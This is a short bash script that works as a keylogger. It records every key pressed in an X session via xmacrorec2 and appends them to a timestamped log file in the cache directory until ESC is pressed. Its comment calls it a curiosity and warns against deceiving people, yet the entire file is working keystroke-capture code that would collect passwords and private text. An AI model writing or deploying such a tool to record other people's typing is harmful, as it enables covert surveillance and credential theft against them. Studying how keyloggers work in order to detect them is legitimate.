#!/bin/bash
#
# Stores keyboard presses in a log file
# the logging is stopped pressing the ESC button
# This script is done just out of curiosity, 
# don't use it to deceive people.
#
# Needs xmacro installed

LOG=${XDG_CACHE_HOME:-"$HOME/.cache"}/$(date +%F_%H%M).log

function log() {

    echo "Writting to \"$LOG\""

    while true
    do

	read key
	[ $? == 0 ] || break

	# remove first 12 chars
	key=${key:12}

	echo "--- $key ${#key}"
	if [ ${#key} == 1 ]
	then
	    # Log the key
	    echo -n $key >> $LOG
	else
	    if [ $key == "space" ]
	    then
		# space
		echo -n " " >> $LOG
	    else
		# add a newline
		echo " «$key»">> $LOG
	    fi
	fi

    done
}


xmacrorec2 -k 9 | grep KeyStrPress | log

